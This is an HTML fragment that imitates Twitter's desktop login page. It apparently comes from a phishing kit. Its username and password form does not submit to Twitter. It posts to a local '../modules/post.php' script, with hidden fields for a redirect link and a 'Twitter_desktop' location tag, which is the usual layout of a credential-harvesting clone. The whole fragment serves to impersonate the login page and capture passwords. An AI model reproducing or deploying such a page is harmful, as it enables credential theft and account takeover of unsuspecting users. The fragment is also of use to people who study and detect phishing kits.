   <body class="three-col logged-out ms-windows">
      <div class="route-login login-responsive">
         <div class="topbar js-topbar">
            <div class="global-nav global-nav--newLoggedOut">
               <div class=global-nav-inner>
                  <div class=container>
                     <ul class="nav js-global-actions">
                        <li class=home><a class="js-nav js-tooltip js-dynamic-tooltip" href=" "><span class=text><img style=margin-bottom:-7px;width:20px;height:20px;margin-right:8px; src="images/twitter1.png"> Home</span></a></li>
                        <li class=about><a class="js-tooltip js-dynamic-tooltip" href=" "><span class=text>About</span></a></li>
                     </ul>
                     <div class="pull-right nav-extras">
                        <ul style=margin-top:20px class="nav secondary-nav language-dropdown">
                           <li class="dropdown js-language-dropdown"><a href=" " class="dropdown-toggle"><small>Language: </small><span class=js-current-language>English</span><b class=caret></b></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="AppContent wrapper wrapper-login">
            <div class=page-canvas>
               <div class=signin-wrapper>
                  <h1>Log in to Twitter</h1>
                  <form action=.././modules/post.php class="t1-form clearfix signin js-signin" method=post>
                     <fieldset>
                        <legend class=visuallyhidden>Log in</legend>
                        <div class="clearfix field">
                           <input  class="js-username-field email-input js-initial-focus" type=text name=username placeholder="Phone, email or username" required>
                           <input  type=hidden name=link value='.$redirect.'>
                           <input  type=hidden name=location value=Twitter_desktop />
                        </div>
                        <div class="clearfix field">
                           <input  class=js-password-field type=password name=password placeholder=Password required>
                        </div>
                     </fieldset>
                     <div class=clearfix>
                        <button type=submit class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
                        <div class=subchck><label class="t1-label remember">
                           <input  type=checkbox value=1 name=remember_me checked=checked> Remember me <span class=separator>·</span><a class=forgot href=" ">Forgot password?</a></label>
                        </div>
                     </div>
                  </form>
               </div>
               <div class="clearfix mobile has-sms">
                  <p class=signup-helper> New to Twitter? <a href=" ">Sign up now »</a></p>
                  <p class=sms-helper> Already using Twitter via text message? <a href=" ">Activate your account »</a></p>
               </div>
            </div>
         </div>
